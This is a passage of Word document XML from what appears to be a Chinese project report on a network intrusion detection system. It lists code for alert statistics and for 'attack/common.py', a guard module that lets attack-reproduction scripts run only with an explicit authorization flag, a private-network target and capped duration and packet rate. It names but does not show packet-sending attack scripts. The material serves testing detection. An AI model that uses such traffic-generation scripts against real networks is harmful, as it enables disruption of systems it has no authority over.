        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "since": since,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FC11D8E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "total_flows": total_flows,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BEABD6F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "by_prediction": by_pred,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B157B5F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "by_probe": by_probe,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A0E3745">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "by_protocol": by_proto,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BB9D123">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "alerts": alerts,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DC13CE9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "timeline": buckets,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FF24EAC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AB8C957">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4837C652">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="39411C98">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def _row_to_dict(row) -&gt; dict:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15372089">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    d = dict(row)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FC74093">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for k in ("features", "evidence", "proba"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65D82927">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if k in d and isinstance(d[k], str):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08B6A69F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0456C871">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                d[k] = json.loads(d[k])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77CA0326">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            except json.JSONDecodeError:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B63170E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F9D950A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return d</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="353DFCD8">
      <w:pPr>
        <w:spacing w:before="0" w:after="160"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5C4FEFEF">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="40"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>代码 3-10　attack/common.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>（71 行）　M7 安全护栏</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27C8A14D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""攻击复现的安全护栏。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F18DABD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="17D54D6A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>这三支脚本只为验证本项目的检测链路而存在，**只允许在本人授权的实验网段内运行**。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6001A873">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>护栏做两件事：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A2D7D4C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="676E4F8D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>1. 目标必须是私有地址（RFC1918 或回环）。往公网发包是违法的，不是"实验"。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29C7D772">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>2. 必须显式传 --i-am-authorized。少打一个字就拒绝运行，比事后道歉便宜。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="793FCD1A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5132C7F4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>另外统一限定持续时间与速率上限，避免误操作把实验网段打瘫。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46C35489">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46DB22B3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="58D4011F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from __future__ import annotations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="624B2A2C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7FEB21ED">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import argparse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15394429">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import ipaddress</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45DA9E8D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import socket</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41BC2E08">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import sys</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BA21C0A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E3E68E8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="69E5E3C1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60CB0E45">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def add_common_args(ap: argparse.ArgumentParser) -&gt; argparse.ArgumentParser:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B9715C9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument("target", help="目标 IPv4 地址，必须是私有网段")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C82E7CC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument("--port", type=int, default=80)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69F3588F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument("--duration", type=float, default=10.0, help="持续秒数，上限 60")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="598B615F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument("--rate", type=float, default=200.0, help="每秒发包数上限 5000")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AFFC9AD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CBC0A28">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "--i-am-authorized",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33433065">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        action="store_true",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65B05A20">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        help="确认目标属于本人的实验网段（不加这个参数不会发任何包）",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F666D4F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78EF242F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return ap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A901646">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1BD60EF3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="35E558B7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def guard(ap: argparse.ArgumentParser, args) -&gt; None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B524884">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if not args.i_am_authorized:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F3F6530">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ap.error("必须显式加 --i-am-authorized 确认目标属于本人授权的实验网段")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2767130F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43816DB7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ip = ipaddress.ip_address(args.target)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BC47602">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    except ValueError:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="444E99AD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ap.error(f"{args.target} 不是合法 IPv4 地址（不要传域名，避免打到公网）")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6574D790">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if not (ip.is_private or ip.is_loopback):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51ABD100">
      <w:pPr>
        <w:widowControl w:val="0"/>
